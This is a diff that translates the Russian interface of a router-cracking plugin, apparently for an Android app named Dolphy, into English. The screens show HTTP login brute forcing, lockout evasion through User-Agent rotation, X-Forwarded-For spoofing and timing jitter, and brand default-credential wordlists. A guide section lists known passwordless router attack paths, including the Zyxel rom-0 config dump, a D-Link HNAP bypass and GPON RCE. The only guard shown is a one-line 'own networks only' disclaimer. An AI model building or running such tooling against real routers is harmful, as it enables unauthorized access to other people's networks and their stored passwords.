-                    eta_line = " · осталось ~{} мин".format(max(1, eta_sec // 60))
+                    eta_line = " · ~{} min left".format(max(1, eta_sec // 60))
                 else:
-                    eta_line = " · осталось ~{} сек".format(eta_sec)
+                    eta_line = " · ~{} s left".format(eta_sec)
             progress_card.extend([
                 ui.row([
                     ui.icon("bolt", 30, tint="primary"),
                     ui.column([
-                        ui.text("Атака идёт", "titleLarge"),
-                        ui.text("⚡ {} попыток/сек · {} мин{}".format(self.pps, elapsed_min, eta_line), "titleSmall", color="primary"),
+                        ui.text("Attack running", "titleLarge"),
+                        ui.text("⚡ {} attempts/s · {} min{}".format(self.pps, elapsed_min, eta_line), "titleSmall", color="primary"),
                     ], spacing=2),
                 ], spacing=12),
                 ui.linear_progress(progress=(float(self.tried_count) / self.expected_total) if self.expected_total > 0 else None),
-                ui.text("{}/{} ({}%) · Неудач: {} · Блокировок: {}".format(
+                ui.text("{}/{} ({}%) · Failures: {} · Lockouts: {}".format(
                     self.tried_count, self.expected_total, percent_done, self.fail_count, self.lockout_count
                 ), "bodyMedium"),
                 ui.text(self.status_line, "bodySmall"),
@@ -2604,26 +2604,26 @@ class NetAuditPro(BasePlugin):
         elif self.found_creds:
             found_user, found_pass, found_mode = self.found_creds
             summary = self.last_run_summary or {}
-            creds_value = "{} / {}".format(found_user if found_user else "(пусто)", found_pass if found_pass else "(пусто)")
+            creds_value = "{} / {}".format(found_user if found_user else "(empty)", found_pass if found_pass else "(empty)")
             progress_card.extend([
                 ui.row([
                     ui.icon("check_circle", 34, tint="success"),
                     ui.column([
-                        ui.text("ДОСТУП ПОЛУЧЕН", "headlineSmall", color="success"),
-                        ui.text("Логин / Пароль", "bodySmall"),
+                        ui.text("ACCESS GAINED", "headlineSmall", color="success"),
+                        ui.text("Login / Password", "bodySmall"),
                         ui.text(creds_value, "headlineMedium"),
-                        ui.text("Способ: {} · Попыток: {}".format(
-                            AUTH_MODE_LABELS.get(found_mode, "HTML-форма POST"),
+                        ui.text("Method: {} · Attempts: {}".format(
+                            AUTH_MODE_LABELS.get(found_mode, "HTML form POST"),
                             summary.get("attempts", self.tried_count)
                         ), "bodyMedium"),
-                        *( [ui.text("⏱ {} сек · средняя скорость {} попыток/сек".format(
+                        *( [ui.text("⏱ {} s · average speed {} attempts/s".format(
                               summary.get("duration_s", "?"), summary.get("avg_pps", 0)
                           ), "bodySmall")] if summary else [] )
                     ], spacing=2),
                 ], spacing=12),
                 ui.row([
-                    ui.button("🔑 Копировать пароль", on_click=self._copy_credentials, style="tonal", fill_max_width=True),
-                    ui.button("📥 Отчёт", on_click=self._export_report, style="outlined", fill_max_width=True),
+                    ui.button("🔑 Copy password", on_click=self._copy_credentials, style="tonal", fill_max_width=True),
+                    ui.button("📥 Report", on_click=self._export_report, style="outlined", fill_max_width=True),
                 ], spacing=8, fill_max_width=True),
             ])
         elif self.tried_count > 0:
@@ -2632,45 +2632,45 @@ class NetAuditPro(BasePlugin):
                 ui.row([
                     ui.icon("block", 34, tint="error"),
                     ui.column([
-                        ui.text("НЕУДАЧА", "headlineSmall", color="error"),
-                        ui.text("Перепробовано {} комбинаций, пароль не подошёл.".format(self.tried_count), "bodyMedium"),
-                        *( [ui.text("⏱ {} сек · средняя скорость {} попыток/сек".format(
+                        ui.text("FAILURE", "headlineSmall", color="error"),
+                        ui.text("Tried {} combinations, the password did not match.".format(self.tried_count), "bodyMedium"),
+                        *( [ui.text("⏱ {} s · average speed {} attempts/s".format(
                               summary.get("duration_s", "?"), summary.get("avg_pps", 0)
                           ), "bodySmall")] if summary else [] )
                     ], spacing=2),
                 ], spacing=12),
-                ui.button("🔓 Искать уязвимости", on_click=self._probe_vulns_button, style="tonal", fill_max_width=True),
+                ui.button("🔓 Look for vulnerabilities", on_click=self._probe_vulns_button, style="tonal", fill_max_width=True),
             ])
         else:
             progress_card.extend([
                 ui.row([
                     ui.icon("shield", 30),
                     ui.column([
-                        ui.text("Статус", "titleLarge"),
+                        ui.text("Status", "titleLarge"),
                         ui.text(self.status_line, "bodyMedium"),
                     ], spacing=2),
                 ], spacing=12),
             ])
         children.append(ui.card(ui.column(progress_card, spacing=8)))
 
-        log_preview = "\n".join(self.logs[-6:]) if self.logs else "Журнал пуст."
+        log_preview = "\n".join(self.logs[-6:]) if self.logs else "Log is empty."
         children.append(ui.card(ui.column([
             ui.row([
-                ui.text("📜 Последние события", "titleSmall"),
-                ui.button("Все", on_click=self._open_logs_screen, style="text"),
-                ui.button("Очистить", on_click=self._clear_logs, style="text")
+                ui.text("📜 Recent events", "titleSmall"),
+                ui.button("All", on_click=self._open_logs_screen, style="text"),
+                ui.button("Clear", on_click=self._clear_logs, style="text")
             ], fill_max_width=True),
             ui.log_panel(log_preview, max_height=140)
         ], spacing=4)))
 
         if self.vulns_found:
-            vuln_items = [ui.text("🔓 Открыто без пароля: {}".format(len(self.vulns_found)), "titleSmall")]
+            vuln_items = [ui.text("🔓 Open without a password: {}".format(len(self.vulns_found)), "titleSmall")]
             for item in self.vulns_found[:8]:
-                vuln_items.append(ui.settings_row(item, "открыто без логина", "lock_open"))
+                vuln_items.append(ui.settings_row(item, "open without login", "lock_open"))
             children.append(ui.card(vuln_items))
 
         children.append(ui.card([
-            ui.text("⚠️ Только для аудита собственных сетей.", "bodySmall")
+            ui.text("⚠️ For auditing your own networks only.", "bodySmall")
         ]))
 
         return ui.scaffold(
@@ -2700,35 +2700,35 @@ class NetAuditPro(BasePlugin):
         self.refresh()
 
     def _super_hack_go(self):
-        self._log("💥 Супер взлом активирован", "HIT")
+        self._log("💥 Super hack activated", "HIT")
         self.navigate("rickroll")
         self.refresh()
 
     def screen_hack_confirm(self, ui, api, state):
-        # обычный экран вместо alert_dialog: Dolphy рисует его мгновенно
+        # a regular screen instead of alert_dialog: Dolphy draws it instantly
         return ui.scaffold(
-            title="💥 Супер взлом",
+            title="💥 Super hack",
             show_back=True,
             content=ui.column([
                 ui.card([
                     ui.icon("warning", 44, tint="warning"),
-                    ui.text("Экстремальный режим", "headlineSmall"),
+                    ui.text("Extreme mode", "headlineSmall"),
                     ui.text(
-                        "Попытка взлома ЛЮБОГО роутера одной кнопкой.\n"
-                        "Очень опасно: роутер может запомнить вас в лицо!\n"
-                        "Настоятельно рекомендуем включить VPN.",
+                        "An attempt to hack ANY router with one button.\n"
+                        "Very dangerous: the router may start recognizing you!\n"
+                        "We strongly recommend enabling a VPN.",
                         "bodyLarge"
                     ),
                 ]),
-                ui.button("💥 Взломать!", on_click=self._super_hack_go, style="error", fill_max_width=True),
-                ui.button("⬅️ Отмена", on_click=self._super_hack_cancel, style="text", fill_max_width=True),
+                ui.button("💥 Crack it!", on_click=self._super_hack_go, style="error", fill_max_width=True),
+                ui.button("⬅️ Cancel", on_click=self._super_hack_cancel, style="text", fill_max_width=True),
             ], padding=16, spacing=12, fill_max_size=True)
         )
 
     def screen_rickroll(self, ui, api, state):
-        # как в usb_c_ir_backend: fullscreen webview, обычная watch-ссылка
+        # as in usb_c_ir_backend: fullscreen webview, a regular watch link
         return ui.scaffold(
-            title="💥 Супер взлом",
+            title="💥 Super hack",
             content=ui.column(
                 [ui.webview(url="https://www.youtube.com/watch?v=dQw4w9WgXcQ", fill_max_size=True)],
                 padding=0,
@@ -2738,15 +2738,15 @@ class NetAuditPro(BasePlugin):
         )
 
     def _probe_vulns_button(self):
-        self.toast("🔓 Ищу незакрытые пути...")
+        self.toast("🔓 Looking for open paths...")
         threading.Thread(target=self.probe_vulnerabilities, daemon=True).start()
 
     def screen_attack_settings(self, ui, api, state):
         children = [
             ui.card(ui.column([
-                ui.text("Режим подбора", "titleMedium"),
+                ui.text("Brute force mode", "titleMedium"),
                 ui.button_group(
-                    [["auto", "Auto"], ["basic", "Basic"], ["form", "Форма"]],
+                    [["auto", "Auto"], ["basic", "Basic"], ["form", "Form"]],
                     self.mode,
                     lambda v: self._set_mode(str(v)),
                 ),
@@ -2755,7 +2755,7 @@ class NetAuditPro(BasePlugin):
                     on_change=lambda v: self._set_threads(int(v)),
                     minimum=1,
                     maximum=32,
-                    title="Количество потоков: {}".format(self.num_threads),
+                    title="Thread count: {}".format(self.num_threads),
                     steps=31
                 ),
                 ui.slider(
@@ -2763,43 +2763,43 @@ class NetAuditPro(BasePlugin):
                     on_change=lambda v: self._set_timeout(int(v)),
                     minimum=1,
                     maximum=10,
-                    title="Таймаут соединения: {} с".format(self.timeout_seconds),
+                    title="Connection timeout: {} s".format(self.timeout_seconds),
                     steps=9
                 ),
                 ui.text_field(
                     value=str(self.port),
                     on_change=lambda v: self._set_port(v),
-                    label="Порт",
+                    label="Port",
                     single_line=True,
                     fill_max_width=True
                 ),
                 ui.switch(
                     checked=self.stop_on_success,
                     on_change=lambda v: self._set_stop_on_success(v),
-                    title="⛔ Стоп после первого успеха",
-                    subtitle="Не продолжать после найденного пароля"
+                    title="⛔ Stop after the first success",
+                    subtitle="Do not continue after a password is found"
                 ),
             ], spacing=8)),
             ui.card(ui.column([
-                ui.text("🥷 Обход блокировок (anti-detect)", "titleMedium"),
+                ui.text("🥷 Lockout evasion (anti-detect)", "titleMedium"),
                 ui.switch(
                     checked=self.evasion_ua,
                     on_change=lambda v: self._set_evasion_ua(v),
-                    title="🎭 Ротация User-Agent",
-                    subtitle="Случайный браузер на каждый запрос"
+                    title="🎭 User-Agent rotation",
+                    subtitle="A random browser for every request"
                 ),
                 ui.switch(
                     checked=self.evasion_xff,
                     on_change=lambda v: self._set_evasion_xff(v),
-                    title="📮 Подмена X-Forwarded-For",
-                    subtitle="Случайный IP в заголовке"
+                    title="📮 X-Forwarded-For spoofing",
+                    subtitle="A random IP in the header"
                 ),
                 ui.slider(
                     value=float(self.attempt_delay_ms),
                     on_change=lambda v: self._set_attempt_delay(int(v)),
                     minimum=0,
                     maximum=2000,
-                    title="Пауза между попытками: {} мс (±50%)".format(self.attempt_delay_ms),
+                    title="Pause between attempts: {} ms (±50%)".format(self.attempt_delay_ms),
                     steps=200
                 ),
                 ui.slider(
@@ -2807,68 +2807,68 @@ class NetAuditPro(BasePlugin):
                     on_change=lambda v: self._set_lockout_pause(int(v)),
                     minimum=0,
                     maximum=120,
-                    title="Кулдаун после {} блокировок подряд: {} с (0 = выкл)".format(
+                    title="Cooldown after {} lockouts in a row: {} s (0 = off)".format(
                         LOCKOUT_THRESHOLD, self.lockout_pause_s
                     ),
                     steps=120
                 ),
             ], spacing=8)),
             ui.card(ui.column([
-                ui.text("Кастомные списки (через запятую)", "titleMedium"),
+                ui.text("Custom lists (comma-separated)", "titleMedium"),
                 ui.text_field(
                     value=self.custom_users_text,
                     on_change=lambda v: self._set_custom_users(v),
-                    label="Юзеры: admin,root,user",
+                    label="Users: admin,root,user",
                     single_line=True,
                     fill_max_width=True
                 ),
                 ui.text_field(
                     value=self.custom_passes_text,
                     on_change=lambda v: self._set_custom_passes(v),
-                    label="Пароли: 1234,qwerty",
+                    label="Passwords: 1234,qwerty",
                     single_line=True,
                     fill_max_width=True
                 ),
             ], spacing=8)),
             ui.card([
-                ui.button("⬅️ Вернуться", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
+                ui.button("⬅️ Back", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
             ])
         ]
-        return ui.scaffold(title="Настройки атаки", content=ui.lazy_column(children=children, padding=16, spacing=12))
+        return ui.scaffold(title="Attack settings", content=ui.lazy_column(children=children, padding=16, spacing=12))
 
     def screen_dict(self, ui, api, state):
         discovered_files = self._scan_dict_files()
         parsed_now = self._dict_preview_pairs(self.custom_dict_text)
 
         file_items = [
-            ui.text("Найденные .txt файлы в памяти телефона (тапни, чтобы загрузить):", "bodyMedium"),
+            ui.text(".txt files found in phone storage (tap to load):", "bodyMedium"),
         ]
         if discovered_files:
             for file_path, file_size in discovered_files[:16]:
                 display_name = os.path.basename(file_path)
                 size_kb = max(1, file_size // 1024)
                 file_items.append(ui.chip(
-                    "{} ({} КБ)".format(display_name, size_kb),
+                    "{} ({} KB)".format(display_name, size_kb),
                     selected=(file_path == self.manual_dict_path),
                     on_click=lambda chosen=file_path: self.load_dict_from_path(chosen)
                 ))
             if len(discovered_files) > 16:
-                file_items.append(ui.text("…и ещё {}. Укажите полный путь вручную.".format(len(discovered_files) - 16), "bodySmall"))
+                file_items.append(ui.text("…and {} more. Enter the full path manually.".format(len(discovered_files) - 16), "bodySmall"))
         else:
-            file_items.append(ui.text(".txt файлы не найдены. Скопируйте словарь в Download/Documents или укажите путь вручную.", "bodySmall"))
+            file_items.append(ui.text("No .txt files found. Copy a dictionary to Download/Documents or enter a path manually.", "bodySmall"))
 
-        preview_items = [ui.text("Первые строки вашего словаря:", "bodySmall")]
+        preview_items = [ui.text("First lines of your dictionary:", "bodySmall")]
         for pair_user, pair_pass in parsed_now[:8]:
-            preview_items.append(ui.text("· {} / {}".format(pair_user, pair_pass if pair_pass else "(пусто)"), "bodySmall"))
+            preview_items.append(ui.text("· {} / {}".format(pair_user, pair_pass if pair_pass else "(empty)"), "bodySmall"))
 
         children = [
             ui.card([
-                ui.text("🔤 Свой словарь паролей", "titleMedium"),
-                ui.text("Каждая строка файла — одна пара:\n  admin password123\n  admin:password123\nСтроки с # игнорируются.", "bodySmall")
+                ui.text("🔤 Custom password dictionary", "titleMedium"),
+                ui.text("Each file line is one pair:\n  admin password123\n  admin:password123\nLines starting with # are ignored.", "bodySmall")
             ]),
             ui.card(file_items),
             ui.card(ui.column([
-                ui.text("Загрузка по полному пути:", "bodyMedium"),
+                ui.text("Load by full path:", "bodyMedium"),
                 ui.text_field(
                     value=str(self.manual_dict_path or ""),
                     on_change=lambda v: self._set_manual_dict_path(v),
@@ -2876,41 +2876,41 @@ class NetAuditPro(BasePlugin):
                     single_line=True,
                     fill_max_width=True
                 ),
-                ui.button("📥 Загрузить этот файл", on_click=self.load_dict_from_path, style="outlined", fill_max_width=True)
+                ui.button("📥 Load this file", on_click=self.load_dict_from_path, style="outlined", fill_max_width=True)
             ], spacing=6)),
             ui.card([
-                ui.text("Пар в словаре сейчас: {}".format(len(parsed_now)), "titleMedium"),
+                ui.text("Pairs in the dictionary now: {}".format(len(parsed_now)), "titleMedium"),
                 ui.text_field(
                     value=self.custom_dict_text,
                     on_change=lambda v: self._set_custom_dict_text(v),
-                    label="Или вставьте текст словаря сюда",
+                    label="Or paste dictionary text here",
                     single_line=False,
                     fill_max_width=True
                 ),
-                ui.button("🗑 Очистить словарь", on_click=self.clear_custom_dict, style="outlined", fill_max_width=True)
+                ui.button("🗑 Clear dictionary", on_click=self.clear_custom_dict, style="outlined", fill_max_width=True)
             ]),
             ui.card(preview_items),
             ui.card([
-                ui.button("⬅️ Вернуться", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
+                ui.button("⬅️ Back", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
             ])
         ]
-        return ui.scaffold(title="Свой словарь", content=ui.lazy_column(children=children, padding=16, spacing=12))
+        return ui.scaffold(title="Custom dictionary", content=ui.lazy_column(children=children, padding=16, spacing=12))
 
     def screen_logs(self, ui, api, state):
-        full_log = "\n".join(self.logs) if self.logs else "Записей нет."
+        full_log = "\n".join(self.logs) if self.logs else "No entries."
         return ui.scaffold(
-            title="Журнал",
+            title="Log",
             actions=[ui.top_action("arrow_back", lambda: self.navigate("main"))],
             content=ui.column([
                 ui.card([
                     ui.row([
-                        ui.text("📜 Все события", "titleMedium"),
-                        ui.button("Очистить", on_click=self._clear_logs, style="text")
+                        ui.text("📜 All events", "titleMedium"),
+                        ui.button("Clear", on_click=self._clear_logs, style="text")
                     ], fill_max_width=True),
                     ui.log_panel(full_log, max_height=320)
                 ]),
                 ui.card([
-                    ui.button("⬅️ Назад", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
+                    ui.button("⬅️ Back", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
                 ])
             ], padding=16, spacing=12)
         )
@@ -2918,63 +2918,63 @@ class NetAuditPro(BasePlugin):
     def screen_guide(self, ui, api, state):
         sections = [
             ui.card([
-                ui.text("📖 Как работает подбор", "titleMedium"),
+                ui.text("📖 How brute force works", "titleMedium"),
                 ui.text(
-                    "Плагин отправляет HTTP-запросы роутеру и перебирает пары логин/пароль.\n\n"
-                    "Два вида защиты:\n"
-                    "• Basic Auth — браузерное окно, работает через заголовок Authorization: Basic.\n"
-                    "• Форма — HTML-форма на странице, работает через POST.\n\n"
-                    "Режим Auto пробует оба способа для каждой пары. Перед стартом разведка читает "
-                    "title страницы, заголовок Server, WWW-Authenticate realm и action формы — по ним выбирается "
-                    "брендовый словарь и адрес POST.",
+                    "The plugin sends HTTP requests to the router and tries login/password pairs.\n\n"
+                    "Two kinds of protection:\n"
+                    "• Basic Auth — a browser popup, works via the Authorization: Basic header.\n"
+                    "• Form — an HTML form on the page, works via POST.\n\n"
+                    "Auto mode tries both methods for each pair. Before the start, recon reads the "
+                    "page title, Server header, WWW-Authenticate realm and form action — and picks the "
+                    "brand wordlist and POST address accordingly.",
                     "bodySmall"
                 )
             ]),
             ui.card([
-                ui.text("🛡 Почему важно выключить VPN", "titleMedium"),
+                ui.text("🛡 Why it matters to turn off VPN", "titleMedium"),
                 ui.text(
-                    "При активном VPN ваш трафик уходит в туннель:\n"
-                    "• автоопределённый шлюз становится адресом VPN-сервера, а не вашего роутера;\n"
-                    "• атаки могут уходить совсем не туда.\n\n"
-                    "Плагин сам проверяет VPN через Android NetworkCapabilities и по характерным "
-                    "Fake-IP диапазонам (198.18.x.x и похожим) и предупредит вас перед стартом.",
+                    "With an active VPN your traffic goes into a tunnel:\n"
+                    "• the auto-detected gateway becomes the VPN server address, not your router;\n"
+                    "• attacks may go entirely the wrong way.\n\n"
+                    "The plugin checks for VPN itself via Android NetworkCapabilities and typical "
+                    "Fake-IP ranges (198.18.x.x and similar) and will warn you before the start.",
                     "bodySmall"
                 )
             ]),
             ui.card([
-                ui.text("🥷 Обход блокировок", "titleMedium"),
+                ui.text("🥷 Lockout evasion", "titleMedium"),
                 ui.text(
-                    "Роутеры считают неудачные попытки входа и могут временно забанить аккаунт.\n\n"
-                    "• Ротация User-Agent — каждый запрос идёт от «разного браузера», сложнее связать попытки.\n"
-                    "• X-Forwarded-For — некоторые панели логируют этот заголовок как адрес клиента.\n"
-                    "• Пауза между попытками (джиттер ±50%) — трафик выглядит как человек.\n"
-                    "• Авто-кулдаун: если пришло 5 ответов 403/429 подряд, плагин замирает на заданное число секунд, "
-                    "потом продолжает со следующего пароля — бан не прилетает, перебор не сбрасывается.",
+                    "Routers count failed login attempts and may temporarily ban the account.\n\n"
+                    "• User-Agent rotation — every request comes from a \"different browser\", making attempts harder to correlate.\n"
+                    "• X-Forwarded-For — some panels log this header as the client address.\n"
+                    "• Pause between attempts (±50% jitter) — traffic looks human.\n"
+                    "• Auto-cooldown: after 5 consecutive 403/429 replies the plugin freezes for a set number of seconds, "
+                    "then continues with the next password — no ban lands and the brute force is not reset.",
                     "bodySmall"
                 )
             ]),
             ui.card([
-                ui.text("📂 Про выбор TXT-словаря", "titleMedium"),
+                ui.text("📂 About choosing a TXT dictionary", "titleMedium"),
                 ui.text(
-                    "Экран «Свой словарь» покажет все .txt файлы из памяти телефона (корень, Download, Documents).\n"
-                    "Тапните по нужному файлу — он загрузится.\n\n"
-                    "Если файл лежит глубже — впишите полный путь в поле и нажмите «Загрузить этот файл».\n"
-                    "Можно просто вставить текст списка в большое поле ввода.\n\n"
-                    "Формат строк: «логин пароль» через пробел, либо логин:пароль. Комментарии начинаются с #.\n\n"
-                    "Почему нет кнопки открытия системного файлового менеджера: текущая версия Dolphy "
-                    "не передаёт результат выбора файла обратно в плагин (нет onActivityResult для плагинов) — "
-                    "это ограничение приложения, оно появится когда автор Dolphy добавит такой API.",
+                    "The \"Custom dictionary\" screen shows all .txt files in phone storage (root, Download, Documents).\n"
+                    "Tap the file you need — it will be loaded.\n\n"
+                    "If the file is deeper down — enter the full path in the field and press \"Load this file\".\n"
+                    "You can also just paste the list text into the large input field.\n\n"
+                    "Line format: \"login password\" separated by a space, or login:password. Comments start with #.\n\n"
+                    "Why there is no system file manager button: the current Dolphy version "
+                    "does not pass the file pick result back to the plugin (no onActivityResult for plugins) — "
+                    "this is an app limitation; it will appear once the Dolphy author adds such an API.",
                     "bodySmall"
                 )
             ]),
             ui.card([
-                ui.text("🔑 Встроенные словари", "titleMedium"),
+                ui.text("🔑 Built-in wordlists", "titleMedium"),
                 ui.text(
-                    "1. Большой встроенный словарь прямо в плагине: {} дефолтных пар (классика всех производителей, "
-                    "RU-провайдеры, GPON-специфика).\n\n"
-                    "2. Брендовые пары по автоопределению бренда.\n\n"
-                    "3. Ваш TXT-словарь — перебирается сразу после брендовых пар.\n\n"
-                    "4. Полная сетка {} имён × {} паролей как страховка.".format(
+                    "1. A large built-in wordlist right in the plugin: {} default pairs (classics from every vendor, "
+                    "RU providers, GPON specifics).\n\n"
+                    "2. Brand pairs based on automatic brand detection.\n\n"
+                    "3. Your TXT dictionary — tried right after the brand pairs.\n\n"
+                    "4. A full grid of {} users × {} passwords as a fallback.".format(
                         len(set(default_dict_pairs())),
                         len(USER_DICT), len(PASS_DICT)
                     ),
@@ -2982,34 +2982,34 @@ class NetAuditPro(BasePlugin):
                 )
             ]),
             ui.card([
-                ui.text("🔓 Проверка дыр без пароля", "titleMedium"),
+                ui.text("🔓 Checking passwordless holes", "titleMedium"),
                 ui.text(
-                    "Если пароль не подобран, плагин проверяет классические незакрытые страницы:\n"
-                    "• /rom-0 — дамп конфига Zyxel с Wi-Fi и PPPoE паролями\n"
-                    "• /HNAP1/ — SOAP D-Link, известные обходы авторизации\n"
-                    "• /getpage.gch...Gpon_epoinfo_t.gch — пароль провайдера на ZTE GPON\n"
-                    "• /GponForm/diag_Form?images/ — обход входа и RCE на GPON\n"
-                    "• /cgi-bin/status_cgi — статус DD-WRT без логина\n"
-                    "• /backup_settings_2.xml — бэкап настроек с паролями\n"
-                    "• Telnet 23 и UPnP 1900 — пробуются напрямую",
+                    "If no password is found, the plugin checks classic unprotected pages:\n"
+                    "• /rom-0 — Zyxel config dump with Wi-Fi and PPPoE passwords\n"
+                    "• /HNAP1/ — D-Link SOAP, known auth bypasses\n"
+                    "• /getpage.gch...Gpon_epoinfo_t.gch — provider password on ZTE GPON\n"
+                    "• /GponForm/diag_Form?images/ — login bypass and RCE on GPON\n"
+                    "• /cgi-bin/status_cgi — DD-WRT status without login\n"
+                    "• /backup_settings_2.xml — settings backup with passwords\n"
+                    "• Telnet 23 and UPnP 1900 — tried directly",
                     "bodySmall"
                 )
             ]),
             ui.card([
-                ui.button("⬅️ Вернуться", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
+                ui.button("⬅️ Back", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
             ])
         ]
-        return ui.scaffold(title="Гайд", content=ui.column(sections, padding=16, spacing=12))
+        return ui.scaffold(title="Guide", content=ui.column(sections, padding=16, spacing=12))
 
     def screen_creds(self, ui, api, state):
         current_brand = (self.brand_hint or "").strip()
-        list_items = [ui.text("🏭 Заводские пары по брендам:", "bodyMedium")]
+        list_items = [ui.text("🏭 Factory pairs by brand:", "bodyMedium")]
         for brand_name, pair_list in BRAND_CREDS.items():
             for pair_user, pair_pass in pair_list:
-                marker = "  ← ваш роутер" if brand_name == current_brand else ""
+                marker = "  ← your router" if brand_name == current_brand else ""
                 list_items.append(ui.text("· {} / {}  [{}]{}".format(
-                    pair_user if pair_user else "(пусто)",
-                    pair_pass if pair_pass else "(пусто)",
+                    pair_user if pair_user else "(empty)",
+                    pair_pass if pair_pass else "(empty)",
                     brand_name,
                     marker
                 ), "bodySmall"))
@@ -3018,29 +3018,29 @@ class NetAuditPro(BasePlugin):
         default_pairs = default_dict_pairs()
         children = [
             ui.card([
-                ui.text("📦 Встроенные наборы", "titleMedium"),
-                ui.text("Большой встроенный словарь: {} пар\nСетка: {} имён × {} паролей\nБыстрые дефолты: {} шт".format(
+                ui.text("📦 Built-in sets", "titleMedium"),
+                ui.text("Large built-in wordlist: {} pairs\nGrid: {} users × {} passwords\nQuick defaults: {} items".format(
                     len(default_pairs), len(USER_DICT), len(PASS_DICT), len(GENERIC_CREDS)
                 ), "bodySmall")
             ]),
             ui.card(ui.column(list_items, spacing=4)),
             ui.card([
-                ui.text("🔤 Ваш словарь: {} пар".format(imported_pairs_count), "bodyMedium")
+                ui.text("🔤 Your dictionary: {} pairs".format(imported_pairs_count), "bodyMedium")
             ]),
             ui.card([
-                ui.button("⬅️ Вернуться", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
+                ui.button("⬅️ Back", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
             ])
         ]
-        return ui.scaffold(title="Словари", content=ui.lazy_column(children=children, padding=16, spacing=12))
+        return ui.scaffold(title="Dictionaries", content=ui.lazy_column(children=children, padding=16, spacing=12))
 
     def screen_report(self, ui, api, state):
-        text_value = self.generated_report_text or "Отчёт ещё не сформирован."
+        text_value = self.generated_report_text or "Report not generated yet."
         return ui.scaffold(
-            title="Отчёт",
+            title="Report",
             actions=[ui.top_action("arrow_back", lambda: self.navigate("main"))],
             content=ui.column([
                 ui.card([
-                    ui.text("Отчёт в буфере обмена и в /sdcard/Download/", "bodySmall"),
+                    ui.text("Report in the clipboard and in /sdcard/Download/", "bodySmall"),
                     ui.text_field(
                         value=text_value,
                         on_change=lambda v: None,
@@ -3050,7 +3050,7 @@ class NetAuditPro(BasePlugin):
                     )
                 ]),
                 ui.card([
-                    ui.button("⬅️ Вернуться", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
+                    ui.button("⬅️ Back", on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)
                 ])
             ], padding=16, spacing=12)
         )
